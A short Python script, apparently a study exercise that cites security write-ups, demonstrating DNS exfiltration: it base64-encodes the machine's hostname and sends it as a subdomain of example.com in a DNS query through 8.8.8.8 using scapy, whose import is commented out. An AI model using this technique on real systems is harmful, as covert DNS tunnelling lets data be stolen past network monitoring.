#Information is being taken from the below notable sources:
#https://unit42.paloaltonetworks.com/dns-tunneling-how-dns-can-be-abused-by-malicious-actors/, https://techwithrohit.medium.com/dns-exfiltration-what-and-how-of-it-dc2dd70f0337

#from scapy.all import *
import base64
import subprocess

def main():

    #gathers information about the machine, just using this to gather the hostname at this time.
    host = subprocess.check_output('hostname')
    b64enc = base64.b64encode(str(host).encode())
    subdomain = b64enc.decode()


    #This performs a web request that returns an associated IP address: https://scapy.readthedocs.io/en/latest/usage.html#dns-requests
    ans = sr1(IP(dst="8.8.8.8")/UDP(sport=RandShort(), dport=53)/DNS(rd=1,qd=DNSQR(qname=f"{subdomain}.example.com",qtype="A")))
    print(ans.an[0].rdata)
